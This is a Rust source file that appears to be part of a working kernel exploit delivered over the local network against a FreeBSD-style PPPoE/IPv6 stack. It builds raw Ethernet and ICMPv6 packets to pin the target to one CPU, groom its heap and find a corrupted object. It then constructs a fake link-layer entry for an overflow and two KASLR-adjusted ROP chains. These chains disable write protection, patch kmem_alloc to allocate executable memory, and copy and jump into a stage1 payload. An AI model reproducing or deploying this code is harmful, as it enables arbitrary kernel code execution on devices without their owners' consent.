use std::io::{self, Write};
use std::str::FromStr;
use std::{thread, time};

use super::offsets::Offsets;
use super::packet::{
    create_icmpv6_adv, create_icmpv6_echo_req, is_icmpv6_echo_reply, is_icmpv6_nd_ns,
};
use crate::constants;
use packet::{ether, Builder};
use pnet::datalink::Channel::Ethernet;
use pnet::datalink::Config;
use pnet::datalink::{self, DataLinkReceiver, DataLinkSender, NetworkInterface};

pub fn create_ethernet_channel(
    interface: &NetworkInterface,
) -> Option<(Box<dyn DataLinkSender>, Box<dyn DataLinkReceiver>)> {
    let config = Config::default();
    match datalink::channel(interface, config) {
        Ok(Ethernet(tx, rx)) => Some((tx, rx)),
        _ => panic!("Error creating datalink channel"),
    }
}

pub fn listen_for_packet<F>(rx: &mut dyn DataLinkReceiver, predicate: F) -> Option<Vec<u8>>
where
    F: Fn(&[u8]) -> bool,
{
    loop {
        match rx.next() {
            Ok(packet) if predicate(packet) => return Some(packet.to_vec()),
            Ok(_) => continue, // packet not matching
            Err(e) => panic!("An error occurred while reading a packet: {}", e),
        }
    }
}

pub fn listen_for_corruption(rx: &mut dyn DataLinkReceiver) -> bool {
    loop {
        match rx.next() {
            Ok(packet) if is_icmpv6_nd_ns(packet) => return true,
            Ok(packet) if is_icmpv6_echo_reply(packet) => return false,
            Ok(_) => continue,
            Err(e) => {
                panic!("An error occurred while reading a packet: {}", e);
            }
        }
    }
}

pub fn extract_pppoe_softc_list(packet: &[u8]) -> Option<u64> {
    // Extract bytes if not return None
    let bytes = packet.get(0x51..0x59)?;
    let mut arr = [0u8; 8];
    arr[..bytes.len()].copy_from_slice(bytes);
    Some(u64::from_le_bytes(arr))
}

pub fn pin_to_cpu_0(tx: &mut dyn DataLinkSender, source_mac: [u8; 6], target_mac: [u8; 6]) {
    for i in 0..constants::PIN_NUM {
        let progress = 100 * i / constants::PIN_NUM;
        print!("\r[+] Pinning to CPU 0... {}%", progress);
        io::stdout().flush().unwrap();

        // Create etherpacket
        let packet = ether::Builder::default()
            .source(source_mac.into())
            .unwrap()
            .destination(target_mac.into())
            .unwrap()
            .protocol(ether::Protocol::PppoeSession)
            .unwrap()
            .build()
            .unwrap();
        // Send the request
        let _result = tx
            .send_to(packet.as_slice(), None)
            .expect("[-] Failed to send etherpacket");
        thread::sleep(time::Duration::from_millis(1));
    }
    println!("\n[+] Pinning to CPU 0...done")
}

pub fn search_for_corrupted_obj(
    tx: &mut dyn DataLinkSender,
    rx: &mut dyn DataLinkReceiver,
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    target_v6: [u8; 16],
) -> Option<[u8; 16]> {
    for i in (0..constants::SPRAY_NUM).rev() {
        let progress = 100 * i / constants::SPRAY_NUM;
        print!("\r[+] Search for corrupted object at {}%", progress);
        io::stdout().flush().unwrap();

        if i >= constants::HOLE_START && i % constants::HOLE_SPACE == 0 {
            continue;
        }
        let source_v6_string = format!("fe80::{:04x}:4141:4141:4141", i);
        let source_v6: [u8; 16] = std::net::Ipv6Addr::from_str(&source_v6_string)
            .expect("Failed to parse IPv6 address")
            .octets();
        // listen for
        let icmpv6_req = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_req.as_slice(), None)
            .expect("[-] Failed to send icmpv6");
        // Listen for packet if echo reply break,else if neighboard solicitation then corrupted
        let currupted = listen_for_corruption(rx);
        if currupted {
            return Some(source_v6);
        }
        let icmpv6_adv = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);
        // Send the request
        let _result = tx
            .send_to(icmpv6_adv.as_slice(), None)
            .expect("[-] Failed to send icmpv6adv");
    }
    None
}

pub fn spray(
    tx: &mut dyn DataLinkSender,
    rx: &mut dyn DataLinkReceiver,
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    target_v6: [u8; 16],
) {
    for i in 0..constants::SPRAY_NUM {
        let progress = 100 * i / constants::SPRAY_NUM;
        // Print progress in place using carriage return
        print!("\r[+] Heap Grooming at {}%", progress);
        io::stdout().flush().unwrap();

        let source_v6_string = format!("fe80::{:04x}:4141:4141:4141", i);
        let source_v6: [u8; 16] = std::net::Ipv6Addr::from_str(&source_v6_string)
            .expect("Failed to parse IPv6 address")
            .octets();
        let icmpv6_req = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_req.as_slice(), None)
            .expect("[-] Failed to send icmpv6");
        //  Wait for response for each req
        let _result = listen_for_packet(rx, is_icmpv6_nd_ns);
        if i >= constants::HOLE_START && i % constants::HOLE_SPACE == 0 {
            continue;
        }
        //  Sends advertisment only to certain response to create hole in the target heap

        let icmpv6_adv = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_adv.as_slice(), None)
            .expect("[-] Failed to send icmpv6adv");
        let _result = listen_for_packet(rx, is_icmpv6_echo_reply);
    }
}

pub fn fragment(stage2: Vec<u8>) -> Vec<Vec<u8>> {
    // Simulate UDP packet creation and IP fragmentation
    let mut fragments = Vec::new();
    const MAX_FRAGMENT_SIZE: usize = 1024;
    // Fragment payload into chunks
    let mut offset = 0;
    while offset < stage2.len() {
        let fragment_size = std::cmp::min(MAX_FRAGMENT_SIZE, stage2.len() - offset);
        let fragment = &stage2[offset..offset + fragment_size];
        offset += fragment_size;

        let mut packet = Vec::new();
        packet.extend_from_slice(fragment);

        fragments.push(packet);
    }
    fragments
}

pub fn build_overflow_lle(pppoe_softc: u64) -> Vec<u8> {
    let mut overflow_lle = Vec::new();

    // lle_next
    overflow_lle.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_AC_COOKIE).to_le_bytes()); // le_next
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // le_prev

    // lle_lock
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lo_name
    overflow_lle.extend(&(constants::RW_INIT_FLAGS | constants::LO_DUPOK).to_le_bytes()); // lo_flags
    overflow_lle.extend(&0u32.to_le_bytes()); // lo_data
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    overflow_lle.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock

    // lle_tbl
    overflow_lle.extend(
        &(pppoe_softc + constants::PPPOE_SOFTC_SC_AC_COOKIE - constants::LLTABLE_LLTIFP)
            .to_le_bytes(),
    ); // lle_tbl
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lle_head
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lle_free
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // la_hold
    overflow_lle.extend(&0u32.to_le_bytes()); // la_numheld
    overflow_lle.extend(&0u32.to_le_bytes()); // pad
    overflow_lle.extend(&0u64.to_le_bytes()); // la_expire

    // la_flags and remaining fields
    overflow_lle.extend(&constants::LLE_EXCLUSIVE.to_le_bytes()); // la_flags
    overflow_lle.extend(&0u16.to_le_bytes()); // la_asked
    overflow_lle.extend(&0u16.to_le_bytes()); // la_preempt
    overflow_lle.extend(&0u16.to_le_bytes()); // ln_byhint
    overflow_lle.extend(&constants::ND6_LLINFO_NOSTATE.to_le_bytes()); // ln_state
    overflow_lle.extend(&0u16.to_le_bytes()); // ln_router
    overflow_lle.extend(&0u32.to_le_bytes()); // pad
    overflow_lle.extend(&0x7fffffffffffffff_u64.to_le_bytes()); // ln_ntick

    overflow_lle
}

pub fn build_second_rop(offsets: &Offsets, kaslr_offset: u64, stage1_len: usize) -> Vec<u8> {
    let mut rop = Vec::new();
    // setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
    rop.extend(&(kaslr_offset + offsets.pop_rdi_ret).to_le_bytes());
    rop.extend(&constants::IDT_UD.to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rsi_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.add_rsp_28_pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rdx_ret).to_le_bytes());
    rop.extend(&constants::SDT_SYSIGT.to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rcx_ret).to_le_bytes());
    rop.extend(&constants::SEL_KPL.to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_r8_pop_rbp_ret).to_le_bytes());
    rop.extend(&0u64.to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.setidt).to_le_bytes());

    // Disable write protection
    rop.extend(&(kaslr_offset + offsets.pop_rsi_ret).to_le_bytes());
    rop.extend(&(constants::CR0_ORI & !constants::CR0_WP).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.mov_cr0_rsi_ud2_mov_eax_1_ret).to_le_bytes());

    // Enable RWX in kmem_alloc
    rop.extend(&(kaslr_offset + offsets.pop_rax_ret).to_le_bytes());
    rop.extend(&constants::VM_PROT_ALL.to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rcx_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.kmem_alloc_patch1).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.mov_byte_ptr_rcx_al_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rcx_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.kmem_alloc_patch2).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.mov_byte_ptr_rcx_al_ret).to_le_bytes());

    // Restore write protection
    rop.extend(&(kaslr_offset + offsets.pop_rsi_ret).to_le_bytes());
    rop.extend(&constants::CR0_ORI.to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.mov_cr0_rsi_ud2_mov_eax_1_ret).to_le_bytes());

    // kmem_alloc(*kernel_map, PAGE_SIZE)
    rop.extend(&(kaslr_offset + offsets.pop_rax_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rdi_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.kernel_map).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.mov_rdi_qword_ptr_rdi_pop_rbp_jmp_rax).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());

    // RSI = PAGE_SIZE
    rop.extend(&(kaslr_offset + offsets.pop_rsi_ret).to_le_bytes());
    rop.extend(&constants::PAGE_SIZE.to_le_bytes());

    // Call kmem_alloc
    rop.extend(&(kaslr_offset + offsets.kmem_alloc).to_le_bytes());

    // R14 = RAX
    rop.extend(&(kaslr_offset + offsets.pop_r8_pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.mov_r14_rax_call_r8).to_le_bytes());

    // memcpy(R14, stage1, len(stage1))
    rop.extend(&(kaslr_offset + offsets.pop_r12_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.mov_rdi_r14_call_r12).to_le_bytes());

    // RSI = RSP + len(rop) - rop_rsp_pos
    rop.extend(&(kaslr_offset + offsets.push_rsp_pop_rsi_ret).to_le_bytes());
    let rop_rsp_pos = rop.len();
    rop.extend(&(kaslr_offset + offsets.pop_rdx_ret).to_le_bytes());
    let rop_off_fixup = rop.len();
    rop.extend(&0xDEADBEEF_u64.to_le_bytes()); // Placeholder
    rop.extend(&(kaslr_offset + offsets.sub_rsi_rdx_mov_rax_rsi_pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());

    // RDX = len(stage1)
    rop.extend(&(kaslr_offset + offsets.pop_rdx_ret).to_le_bytes());
    rop.extend(&(stage1_len as u64).to_le_bytes());

    // Call memcpy
    rop.extend(&(kaslr_offset + offsets.memcpy).to_le_bytes());

    // Jump into stage1
    rop.extend(&(kaslr_offset + offsets.jmp_r14).to_le_bytes());

    // Fixup offset of stage1
    let stage1_fixup_value = -((rop.len() - rop_rsp_pos) as i64);
    rop[rop_off_fixup..rop_off_fixup + 8].copy_from_slice(&stage1_fixup_value.to_le_bytes());

    rop
}

pub fn build_first_rop(
    offsets: &Offsets,
    stage1_len: usize,
    fake_lle: &[u8],
    rop2: &[u8],
    kaslr_offset: u64,
) -> Vec<u8> {
    let mut rop = Vec::new();

    // RDI = RBX - 0x800
    rop.extend(&(kaslr_offset + offsets.pop_r12_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.mov_rdi_rbx_call_r12).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rcx_ret).to_le_bytes());
    rop.extend(&(-0x800i64).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.add_rdi_rcx_ret).to_le_bytes());

    // RSI += len(fake_lle + rop)
    rop.extend(&(kaslr_offset + offsets.pop_rdx_ret).to_le_bytes());
    let rop_off_fixup = rop.len();
    rop.extend(&0xDEADBEEF_u64.to_le_bytes()); // Placeholder
    rop.extend(&(kaslr_offset + offsets.sub_rsi_rdx_mov_rax_rsi_pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());

    // RDX = len(rop2 + stage1)
    rop.extend(&(kaslr_offset + offsets.pop_rdx_ret).to_le_bytes());
    rop.extend(&(rop2.len() + stage1_len).to_le_bytes());

    // Call memcpy
    rop.extend(&(kaslr_offset + offsets.memcpy).to_le_bytes());

    // Stack pivot
    rop.extend(&(kaslr_offset + offsets.pop_rax_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.mov_rsi_rbx_call_rax).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.pop_rdx_ret).to_le_bytes());
    rop.extend(&(0x800u64 + 0x20u64).to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.sub_rsi_rdx_mov_rax_rsi_pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());
    rop.extend(&(kaslr_offset + offsets.lea_rsp_rsi_20_repz_ret).to_le_bytes());

    // Fixup offset of rop2
    let len_fixup = fake_lle.len() + rop.len();
    let fixup_value = -(len_fixup as i64);
    rop[rop_off_fixup..rop_off_fixup + 8].copy_from_slice(&fixup_value.to_le_bytes());

    rop
}
